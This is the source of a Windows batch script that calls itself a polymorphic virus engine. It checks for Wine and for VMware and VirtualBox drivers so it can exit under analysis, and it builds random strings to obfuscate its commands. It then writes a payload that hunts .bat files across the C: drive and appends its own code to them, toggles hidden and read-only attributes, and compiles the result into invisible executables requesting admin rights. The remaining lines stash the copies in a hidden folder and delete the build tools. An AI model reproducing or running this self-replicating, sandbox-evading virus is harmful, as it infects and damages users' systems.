::This is a polymorphic engine wrote completely in Batch
::@blmvxer
::
::We Need Anti-Wine(Utilize-Wine), Anti-Vbox, and Anti-Emulator::
@echo off
::Check for WINE
IF EXIST "Z:\" (GOTO WINE) ELSE (GOTO NOWINE)
:WINE
echo "Wine Exist time to go!!!"
goto AVWVBEM
:NOWINE
echo "Wine Not Found Continue"
::Anti-VirtualMachine
IF EXIST "C:\windows\system32\drivers\vmci.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmhgfs.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmmouse.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmscsi.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmusbmouse.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmx_svga.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\vmxnet.sys" (GOTO AVWVBEM)
IF EXIST "C:\windows\system32\drivers\VBoxMouse.sys" (GOTO AVWVBEM) ELSE (GOTO Lets_Begin)
:Lets_Begin
::Set counter to 0 so we can run a new encryption for different strings
set counter=0
::Polymorphic Engine
:loop
setlocal EnableDelayedExpansion
::Set Longest Length to be 20
set _RNDLength=20
::Our Character Pool
set _Alphanumeric=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set _Str=%_Alphanumeric%987654321
:_Lenloop
if not "%_Str:~18%"=="" set _Str=%_Str:~9%& set /A _Len+=9& goto :_Lenloop
set _tmp=%_Str:~9,1%
set /A _Len=_Len+_tmp
set _count=0
set _RndAlphaNum=
:_loop
::The Magic!
set /A _count+=1
set _RND=%random%
set /A _RND=_RND%%%_Len%
set _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
if !_count! lss %_RNDLength% goto _loop
::String Encryption
::We run through the whole Engine for each String to allow a completely random charater length
::and Generated String.
set /A counter=%counter%+1
if %counter% EQU 1 set AAA=!_RndAlphaNum!
if %counter% EQU 2 set BBB=!_RndAlphaNum!
if %counter% EQU 3 set CCC=!_RndAlphaNum!
if %counter% EQU 4 set DDD=!_RndAlphaNum!
if %counter% EQU 5 set FFF=!_RndAlphaNum!
if %counter% EQU 6 set GGG=!_RndAlphaNum!
if %counter% EQU 7 set LLL=!_RndAlphaNum!
if %counter% EQU 8 set MMM=!_RndAlphaNum!
if %counter% EQU 9 set JJJ=!_RndAlphaNum!
if %counter% EQU 10 set KKK=!_RndAlphaNum!
if %counter% EQU 10 (goto ENCR) else (goto loop)
:ENCR
::Virus Protection
copy /Y poly.exe C:\!FFF!.exe
del /F poly.exe
goto VIRUS
::Here is where we pass our encryption over to the virus,
:VIRUS
set "us=%%0"
set "lvar=@echo off"
(
echo !lvar!
) > !DDD!.bat
::Attributes
set "attrib1=attrib +r +h !us!"
(
echo !attrib1!
) >> !DDD!.bat
::Standard SET Encryption with PolyStrings
echo set !AAA!=for >> !DDD!.bat
echo set !BBB!=do >> !DDD!.bat
echo set !CCC!=type >> !DDD!.bat
set "var=%%%%a"
set "var2=%%%%F"
set "var6=%%%%"
set "var7=in"
echo SET SrcCount=0 >> !DDD!.bat
echo SET SrcMax=%%RANDOM%% >> !DDD!.bat
set "findvictim=%%!AAA!%% /R !var2! IN (C:\*.bat) DO IF !SrcCount! LSS %%SrcMax%% ("
(
echo !findvictim!
) >> !DDD!.bat
set "var3=SET %/A% SrcCount += 1"
set "var4=Set victim=!var6!!var2!"
set "var5=)"
(
echo !var3!
echo !var4!
echo !var5!
) >> !DDD!.bat
::Push the completed virus code to new host
set "virus=%%!AAA!%% /R !var! !var7! (%%victim%%) %%!BBB!%% %%!CCC!%% !us! >> !var!"
(
echo !virus!
) >> !DDD!.bat
::Attributes 2
set "attrib2=attrib -r -h !us!"
(
echo !attrib2!
) >> !DDD!.bat
goto :CheckOS
::
:CheckOS
IF EXIST "%PROGRAMFILES(X86)%" (GOTO 64BIT) ELSE (GOTO 32BIT)
:64BIT
start b2exe64.exe -bat !DDD!.bat -save !DDD!.exe -invisible -admin -overwrite
GOTO DONE
:32BIT
start b2exe32.exe -bat !DDD!.bat -save !DDD!.exe -invisible -admin -overwrite
GOTO DONE
:DONE
del !DDD!.bat
mkdir C:\fij4Jdo9mdn00sqW
move !DDD!.exe C:\fij4Jdo9mdn00sqW
move poly.bat C:\fij4Jdo9mdn00sqW
:CheckOS2
IF EXIST "%PROGRAMFILES(X86)%" (GOTO 641BIT) ELSE (GOTO 321BIT)
:641BIT
start b2exe64.exe -bat C:\fij4Jdo9mdn00sqW\poly.bat -save C:\fij4Jdo9mdn00sqW\!MMM!.exe -invisible -admin -overwrite
GOTO END
:321BIT
start b2exe32.exe -bat C:\fij4Jdo9mdn00sqW\poly.bat -save C:\fij4Jdo9mdn00sqW\!MMM!.exe -invisible -admin -overwrite
::END
del /f %curdir%\b2exe32.exe
del /f %curdir%\b2exe64.exe
del %curdir%\poly.exe
:AVWVBEM
exit
